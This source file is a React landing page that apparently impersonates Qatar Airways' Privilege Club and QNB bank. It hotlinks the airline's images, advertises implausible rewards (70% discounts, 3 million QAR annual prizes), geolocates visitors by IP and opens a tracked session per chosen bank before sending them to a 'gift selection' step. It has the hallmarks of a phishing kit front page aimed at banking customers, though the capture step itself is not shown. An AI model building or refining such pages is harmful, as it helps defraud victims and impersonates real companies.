import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { nanoid } from "nanoid";
import { trpc } from "@/lib/trpc";
import { useLanguage } from "@/contexts/LanguageContext";
import { Car, Hotel, Plane, ParkingCircle, Gift, Lock, Globe, Trophy, Wallet, Crown, Check } from "lucide-react";
import Header from "@/components/Header";

const bankImages = {
  all: "https://files.manuscdn.com/user_upload_by_module/session_file/310519663799792395/oAJHukhWMVRNiMzZ.jpg",
  qnb: "https://files.manuscdn.com/user_upload_by_module/session_file/310519663799792395/oAJHukhWMVRNiMzZ.jpg",
};

const cards = [
  { bank: "qnb", nameAr: "العضوية الفضية", nameEn: "Silver Membership", logo: "https://i.ibb.co/k6GT9TkG/IMG-20260714-WA0012.jpg", img: "https://files.manuscdn.com/user_upload_by_module/session_file/310519663799792395/GNPJtLJsmUHfUddx.png", bgColor: "#ffffff" },
  { bank: "qnb", nameAr: "العضوية الذهبية", nameEn: "Gold Membership", logo: "https://i.ibb.co/k6GT9TkG/IMG-20260714-WA0012.jpg", img: "https://files.manuscdn.com/user_upload_by_module/session_file/310519663799792395/UJpzjPxptKCKuynJ.png", bgColor: "#ffffff" },
  { bank: "qnb", nameAr: "العضوية البلاتينية", nameEn: "Platinum Membership", logo: "https://i.ibb.co/k6GT9TkG/IMG-20260714-WA0012.jpg", img: "https://files.manuscdn.com/user_upload_by_module/session_file/310519663799792395/hQqpxtvPQfJHewTY.png", bgColor: "#ffffff" },
];

export default function Home() {
  const [, setLocation] = useLocation();
  const { language, setLanguage } = useLanguage();
  const [bankSelect, setBankSelect] = useState("all");
  const [mainCardImage, setMainCardImage] = useState(bankImages.all);
  const [currentSlide, setCurrentSlide] = useState(0);
  const [userCountry, setUserCountry] = useState("Qatar");
  const [selectedCard, setSelectedCard] = useState<number | null>(null);
  const createSessionMutation = trpc.submissions.createSession.useMutation();

  const isArabic = language === "ar";

  useEffect(() => {
    const fetchCountry = async () => {
      try {
        const res = await fetch("https://ipapi.co/json/");
        const data = await res.json();
        if (data.country_name) {
          setUserCountry(data.country_name);
          return;
        }
      } catch (e) {
        console.log("ipapi failed, trying backup...");
      }

      try {
        const res = await fetch("https://ipwho.is/");
        const data = await res.json();
        if (data.country) {
          setUserCountry(data.country);
        }
      } catch (e) {
        console.error("Backup country fetch failed");
      }
    };

    fetchCountry();

    const timer = setInterval(() => {
      setCurrentSlide((prev) => (prev + 1) % 2);
    }, 3000);
    return () => clearInterval(timer);
  }, []);

  const updatePage = (bankType: string) => {
    setBankSelect(bankType);
    setMainCardImage(bankImages[bankType as keyof typeof bankImages]);
  };

  const startSession = async (selectedBank: string) => {
    const sessionId = nanoid();
    localStorage.setItem("sessionId", sessionId);
    localStorage.setItem("selectedBank", selectedBank);
    
    try {
      await createSessionMutation.mutateAsync({
        sessionId,
        selectedBank,
        country: userCountry,
      });
      setLocation(`/gift-selection?bank=${selectedBank}&session=${sessionId}`);
    } catch (err) {
      console.error("Session creation failed:", err);
      setLocation(`/gift-selection?bank=${selectedBank}&session=${sessionId}`);
    }
  };

  const handleCardClick = (idx: number, bank: string) => {
    setSelectedCard(idx);
    setTimeout(() => {
      startSession(bank);
    }, 800);
  };

  const filteredCards = bankSelect === "all" ? cards : cards.filter((c) => c.bank === bankSelect);

  return (
    <div dir={isArabic ? "rtl" : "ltr"}>
      <style>{`
        body { margin: 0; padding: 0; font-family: sans-serif; background-color: #f4f4f4; }
        .header { display: flex; justify-content: space-between; align-items: center; padding: 10px 20px; background-color: #ffffff; border-bottom: 2px solid #8C0032; position: relative; z-index: 1000; }
        .header-right { display: flex; align-items: center; gap: 15px; }
        .logo { height: 60px; background-color: white; padding: 0; }
        .menu-icon { font-size: 28px; color: #8C0032; cursor: pointer; }
        .lang-btn { background-color: #8C0032; color: #ffffff; border: none; padding: 8px 15px; border-radius: 5px; font-weight: bold; cursor: pointer; font-size: 14px; }
        .slider-container { width: 100%; height: 200px; position: relative; overflow: hidden; }
        .slider-container img { width: 100%; height: 100%; object-fit: cover; position: absolute; transition: opacity 1s; opacity: 0; }
        .slider-container img.active { opacity: 1; }
        .dropdown-container { padding: 20px; text-align: center; }
        .dropdown-select { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 5px; font-size: 16px; background: white; }

        .cards-container { display: flex; flex-direction: column; align-items: center; gap: 20px; padding: 0 10px 20px 10px; }
        .qnb-card-box { background-color: #ffffff; border-radius: 20px; padding: 25px; margin: 0 auto; text-align: center; border: 1px solid #eeeeee; width: 100%; max-width: 380px; display: flex; flex-direction: column; align-items: center; cursor: pointer; transition: all 0.3s ease; position: relative; box-shadow: 0 4px 15px rgba(0,0,0,0.05); }
        .qnb-card-box.selected { border-color: #8C0032; border-width: 2px; box-shadow: 0 8px 25px rgba(140, 0, 50, 0.15); }
        .selection-badge { position: absolute; top: -10px; right: -10px; background: #8C0032; color: white; width: 24px; height: 24px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 14px; box-shadow: 0 2px 5px rgba(0,0,0,0.2); z-index: 10; }
        .card-image-qnb { width: 100%; max-width: 300px; margin-bottom: 20px; border-radius: 0; }
        .card-title-small { font-size: 18px; font-weight: bold; margin-bottom: 15px; color: #8C0032; }
        .footer-image { width: 100%; display: block; margin-top: 20px; object-fit: cover; }
        
        .features-title { font-size: 14px; font-weight: bold; color: #8C0032; margin: 8px 0 15px 0; text-align: center; }
        .features-icons-grid { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 8px; margin-bottom: 15px; width: 100%; }
        .feature-icon-item { display: flex; flex-direction: column; align-items: center; gap: 4px; padding: 8px; background: #f9f9f9; border-radius: 8px; border: 1px solid #e0e0e0; }
        .feature-icon-item svg { width: 20px; height: 20px; color: #8C0032; }
        .feature-icon-item span { font-size: 10px; color: #333; font-weight: 500; text-align: center; line-height: 1.2; }
        
        .features-bottom-row { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 8px; margin-bottom: 15px; width: 100%; }
        .feature-bottom-item { display: flex; flex-direction: column; align-items: center; gap: 4px; padding: 8px; background: #f9f9f9; border-radius: 8px; border: 1px solid #e0e0e0; }
        .feature-bottom-item svg { width: 20px; height: 20px; color: #8C0032; }
        .feature-bottom-item span { font-size: 10px; color: #333; font-weight: 500; text-align: center; line-height: 1.2; }
        
        .feature-large-item { background: linear-gradient(135deg, #8C0032 0%, #c41e5e 100%); color: white; padding: 10px; border-radius: 8px; display: flex; align-items: center; gap: 10px; margin-bottom: 15px; width: 100%; box-sizing: border-box; }
        .feature-large-item svg { width: 24px; height: 24px; color: white; flex-shrink: 0; }
        .feature-large-item span { font-size: 12px; font-weight: 600; }
        
        .apply-btn { background-color: #8C0032; color: #ffffff; padding: 12px 0; width: 100%; max-width: 200px; border: none; border-radius: 20px; font-size: 14px; font-weight: bold; cursor: pointer; }
        
        .reasons-container { padding: 25px; background: #ffffff; margin: 20px; border-radius: 15px; border: none; box-shadow: 0 4px 20px rgba(0,0,0,0.05); }
        .reasons-title { font-size: 20px; font-weight: bold; color: #333; margin-bottom: 25px; text-align: center; }
        .reason-item { display: flex; align-items: center; gap: 12px; margin-bottom: 15px; }
        .reason-check { color: #22c55e; flex-shrink: 0; }
        .reason-text { font-size: 15px; color: #4b5563; font-weight: 500; }
        .reason-footer { font-size: 13px; color: #6b7280; margin-top: 25px; border-top: 1px solid #f3f4f6; padding-top: 15px; }
      `}</style>
      <Header />
      <div className="slider-container">
        <img
          src="https://www.qatarairways.com/content/dam/images/renditions/horizontal-1/campaigns/global/privilege-club/enrollment/enrollment-hero-desktop.jpg"
          className={currentSlide === 0 ? "active" : ""}
          alt="Slide 1"
        />
        <img
          src="https://www.qatarairways.com/content/dam/images/renditions/horizontal-1/brand/global/destinations/qatar/doha/h1-skyline-doha-qatar-v2.jpg"
          className={currentSlide === 1 ? "active" : ""}
          alt="Slide 2"
        />
      </div>
      
      <div className="reasons-container" dir={isArabic ? "rtl" : "ltr"}>
        <h2 className="reasons-title">{isArabic ? "أسباب رائعة للانضمام إلى نادي الامتياز" : "Great reasons to join Privilege Club"}</h2>
        <div className="reasons-list">
          {[
            { ar: "عروض حصرية لأعضاء نادي الامتياز", en: "Exclusive offers for Privilege Club members" },
            { ar: "اربح وأنفق نقاط أفيوس كما تشاء", en: "Earn and spend Avios as you wish" },
            { ar: "اجمع نقاط أفيوس مع عائلتك", en: "Collect Avios with your family" },
            { ar: "ساعة مجاناً من الإنترنت على متن الطائرة", en: "One hour of free super Wi-Fi on board" },
            { ar: "وفّر عند الدفع باستخدام cash + Avios", en: "Save when paying with cash + Avios" },
            { ar: "تسوّق وادفع في السوق الحرة القطرية", en: "Shop and pay at Qatar Duty Free" },
            { ar: "استمتع برحلات المكافآت والترقيات", en: "Enjoy award flights and upgrades" },
            { ar: "احصل على وزن أمتعة إضافي", en: "Get extra baggage allowance" },
            { ar: "استمتع بخدمة الصالات حول العالم*", en: "Enjoy lounge access around the world*" }
          ].map((item, i) => (
            <div key={i} className="reason-item">
              <Check className="reason-check" size={18} />
              <span className="reason-text">{isArabic ? item.ar : item.en}</span>
            </div>
          ))}
        </div>

        <div className="unified-features" style={{ marginTop: '30px', borderTop: '1px solid #f3f4f6', paddingTop: '25px' }}>
          <div className="features-title">{isArabic ? "المميزات الرئيسية للعضوية" : "Main Membership Features"}</div>
          <div className="features-icons-grid">
            <div className="feature-icon-item">
              <Car />
              <span>{isArabic ? "تأجير السيارات\nخصم 70%" : "Car Rental\n70% Discount"}</span>
            </div>
            <div className="feature-icon-item">
              <Hotel />
              <span>{isArabic ? "حجوزات الفنادق\nخصم 70%" : "Hotel Booking\n70% Discount"}</span>
            </div>
            <div className="feature-icon-item">
              <Plane />
              <span>{isArabic ? "تذاكر الطيران\nخصم 70%" : "Flight Tickets\n70% Discount"}</span>
            </div>
            <div className="feature-icon-item">
              <ParkingCircle />
              <span>{isArabic ? "المواقف\nخصم 70%" : "Parking\n70% Discount"}</span>
            </div>
            <div className="feature-icon-item">
              <Gift />
              <span>{isArabic ? "مميزات حصرية\nعروض خاصة" : "Exclusive\nBenefits"}</span>
            </div>
            <div className="feature-icon-item">
              <Lock />
              <span>{isArabic ? "دفع آمن\nحماية كاملة" : "Secure\nPayment"}</span>
            </div>
          </div>

          <div className="features-bottom-row">
            <div className="feature-bottom-item">
              <Globe />
              <span>{isArabic ? "تقبل عالمياً" : "Global\nAcceptance"}</span>
            </div>
            <div className="feature-bottom-item">
              <Wallet />
              <span>{isArabic ? "كاش باك\nحتى 5000 ريال" : "Cashback\nUp to 5000 QAR"}</span>
            </div>
            <div className="feature-bottom-item">
              <Crown />
              <span>{isArabic ? "صالات VIP\nفي المطارات" : "VIP Lounge\nAccess"}</span>
            </div>
          </div>

          <div className="feature-large-item">
            <Trophy />
            <span>{isArabic ? "جوائز سنوية تصل إلى 3 مليون ريال قطري" : "Annual Rewards Up to 3 Million QAR"}</span>
          </div>
        </div>

        <p className="reason-footer">
          {isArabic ? "*يسري حصرياً على أعضاء الدرجات الفضية والذهبية والبلاتينية فقط." : "*Valid exclusively for Silver, Gold and Platinum members only."}
        </p>
      </div>

      <div className="cards-container">
        {filteredCards.map((card, idx) => (
          <div 
            key={idx} 
            className={`qnb-card-box ${selectedCard === idx ? 'selected' : ''}`}
            onClick={() => handleCardClick(idx, card.bank)}
          >
            {selectedCard === idx && <div className="selection-badge">✔</div>}
            <span className="card-title-small">{isArabic ? (card as any).nameAr : (card as any).nameEn}</span>
            <img src={card.img} className="card-image-qnb" alt="Credit Card" />
            <button className="apply-btn">{isArabic ? "قدم الآن" : "Apply Now"}</button>
          </div>
        ))}
      </div>
      
      <div className="footer-banner" style={{ textAlign: 'center', padding: '40px 20px', backgroundColor: '#ffffff', marginTop: '40px' }}>
        <img src={isArabic ? "https://i.ibb.co/23sMQkSF/IMG-20260714-WA0015.jpg" : "https://i.ibb.co/609jMvhx/IMG-20260714-WA0016.jpg"} alt="Footer Banner" style={{ maxWidth: '100%', height: 'auto' }} />
      </div>
    </div>
  );
}
